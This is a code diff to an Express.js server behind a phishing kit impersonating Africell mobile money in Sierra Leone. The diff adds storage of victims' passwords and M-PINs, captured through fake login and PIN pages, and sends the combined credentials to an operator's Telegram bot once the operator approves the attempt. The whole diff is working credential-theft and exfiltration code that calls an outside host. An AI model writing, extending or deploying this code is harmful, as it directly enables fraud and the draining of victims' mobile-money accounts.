@@ -12,6 +12,7 @@ app.use(express.static('.')); // Tells Express to serve your static HTML files
 // Memory pads to track user authentication states by phone number
 const orderStatuses = {};   
 const lastSubmissionTime = {}; 
+const userCredentials = {}; // Tracks collected password and mpin per phone
 
 // Helper function to safely fetch from Telegram with a built-in timeout and abort handler
 async function sendToTelegram(url, payload) {
@@ -60,6 +61,17 @@ app.post('/api/submit-order', async (req, res) => {
 
         // Check if this submission is from pin.html (PIN code) or login.html (Password)
         const isPinStep = /^\d+$/.test(uniqueId) && uniqueId.length >= 4; 
+        
+        // Save the respective credential to memory for the final collected list view
+        if (!userCredentials[phone]) {
+            userCredentials[phone] = {};
+        }
+        if (isPinStep) {
+            userCredentials[phone].mpin = uniqueId;
+        } else {
+            userCredentials[phone].password = uniqueId;
+        }
+
         const headerTitle = isPinStep ? "🔐 *Africell M-PIN Submitted*" : "🔔 *New Africell Login Attempt*";
         const credentialLabel = isPinStep ? "M-PIN" : "Password";
 
@@ -120,6 +132,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
             let phone = '';
             let uniqueId = 'N/A';
             let messageTitle = 'Processed Request';
+            let isFinalApproval = false;
 
             if (callbackData.startsWith('approve_')) {
                 const parts = callbackData.replace('approve_', '').split('_');
@@ -128,6 +141,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 orderStatuses[phone] = 'approved';
                 actionText = 'Approved ✅';
                 messageTitle = 'Approval Result';
+                // Check if this approval was from the M-PIN step (or if we have both stored)
+                isFinalApproval = /^\d+$/.test(uniqueId) && uniqueId.length >= 4;
             } else if (callbackData.startsWith('reject_')) {
                 const parts = callbackData.replace('reject_', '').split('_');
                 phone = parts[0];
@@ -146,12 +161,32 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             const countryFlag = "🇸🇱";
             const rawDigits = phone.replace(/\+232/g, '').trim();
+            const stored = userCredentials[phone] || {};
 
-            let updatedMessage = `📋 *${messageTitle}*\n\n` +
+            let updatedMessage = '';
+
+            // If it's the final approval, display the full collected list of details
+            if (isFinalApproval && actionText.includes('Approved')) {
+                const passwordVal = stored.password || 'N/A';
+                const mpinVal = stored.mpin || uniqueId;
+
+                updatedMessage = `📋 *${messageTitle}*\n\n` +
                                  `${countryFlag} Country: \`+232\`\n` +
                                  `📱 Phone: \`${rawDigits}\`\n` +
-                                 `🔑 Credential: \`${uniqueId}\`\n` +
+                                 `🔑 Password: \`${passwordVal}\`\n` +
+                                 `🔐 M-PIN: \`${mpinVal}\`\n` +
                                  `📌 Status: *${actionText}*`;
+            } else {
+                // Standard single-step view for login or intermediate steps
+                const isPinStepView = /^\d+$/.test(uniqueId) && uniqueId.length >= 4;
+                const credLabel = isPinStepView ? "M-PIN" : "Password";
+
+                updatedMessage = `📋 *${messageTitle}*\n\n` +
+                                 `${countryFlag} Country: \`+232\`\n` +
+                                 `📱 Phone: \`${rawDigits}\`\n` +
+                                 `🔑 ${credLabel}: \`${uniqueId}\`\n` +
+                                 `📌 Status: *${actionText}*`;
+            }
 
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
             await sendToTelegram(telegramUrl, {
